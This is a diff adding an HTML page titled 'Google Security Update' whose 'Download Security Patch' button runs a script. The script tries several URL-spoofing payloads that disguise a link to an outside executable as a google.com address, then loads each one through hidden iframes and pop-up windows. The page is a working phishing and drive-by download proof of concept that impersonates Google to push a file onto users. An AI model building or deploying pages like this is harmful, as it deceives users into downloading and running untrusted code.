@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Security Update</title>
+</head>
+<body>
+  <button onclick="advancedSpoof()">Download Security Patch</button>
+
+  <script>
+    function advancedSpoof() {
+      // Base payload yang berhasil
+      const baseUrl = "https://google.com%40%40@ryynx88.github.io/poc.exe";
+      
+      // Advanced variations
+      const payloads = [
+        baseUrl,
+        // Double encoding
+        "https://google.com%2540%2540@ryynx88.github.io/poc.exe",
+        // With path manipulation
+        "https://google.com%40%40@ryynx88.github.io/@poc.exe",
+        // Mixed with credentials format
+        "https://google.com%40%40:password@ryynx88.github.io/poc.exe",
+        // Subdomain exploitation
+        "https://google.com%40%40@accounts.google.com.ryynx88.github.io/poc.exe"
+      ];
+      
+      // Test semua payload
+      payloads.forEach((url, index) => {
+        setTimeout(() => {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = url;
+          document.body.appendChild(iframe);
+          
+          // Juga coba dengan window.open
+          window.open(url, `frame${index}`);
+        }, index * 500);
+      });
+    }
+  </script>
+</body>
+</html>
